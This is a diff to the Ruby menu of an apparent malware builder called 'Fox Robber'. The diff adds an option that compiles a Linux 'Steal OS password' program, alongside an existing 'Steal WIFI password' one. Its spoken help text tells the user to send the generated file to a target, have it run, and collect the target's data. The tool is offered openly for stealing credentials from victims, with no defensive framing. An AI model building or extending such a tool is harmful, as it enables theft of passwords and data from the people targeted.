@@ -72,7 +72,7 @@ while true
           if %w[0 back].include?(command_fox_robber)
             break
           else
-            puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back".green
+            puts "What do you want:\n[9]. Steal WIFI password\n[10]. Steal OS password\n[0]. Back".green
             job = 'fox-robber [linux]'
             print "\n(#{job})>".yellow
             command_linux = gets.chomp
@@ -82,6 +82,15 @@ while true
               system('crystal build Linux/Linux_Steal\ WIFI\ password.cr')
               system('chmod -r+x Linux_Steal\ WIFI\ password')
               system('mv Linux_Steal\ WIFI\ password Out/')
+              puts 'File made by Fox Robber 🦊'.red
+              system("echo \"\t<Press enter>\" | lolcat -a")
+              gets.chomp
+              break
+            when '10', 'steal-os-password'
+              puts 'Loading...'.blue
+              system('crystal build Linux/Linux_Steal\ OS\ password.cr')
+              system('chmod -r+x Linux_Steal\ OS\ password')
+              system('mv Linux_Steal\ OS\ password Out/')
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
@@ -120,7 +129,7 @@ while true
     describe = All::Explain.new
     describe.explain
     system('espeak \'Hi Hackers.
-      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.  How to use it?(1) First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.(2) Send the file for your target.(3) Run the file.(4) The END. you copied your target data and you can see your targets files in your PC.[0] back. Write \"exit\" to exit in first page.\'')
+      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.  How to use it?(1) First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.(2) Send the file for your target.(3) Run the file.(4) The END. you copied your target data and you can see your targets files in your PC.[0] back. Write exit to exit in first page.\'')
     while true
       job = 'explain'
       print "\n(#{job})>".yellow
@@ -136,6 +145,7 @@ while true
   when '0', 'back'
     next
   when 'exit'
+    system('espeak \'Have a nice day\'')
     system('clear')
     system('chafa images.png')
     system("echo \t\"FOX ROBBER\" | lolcat -a -d 30")
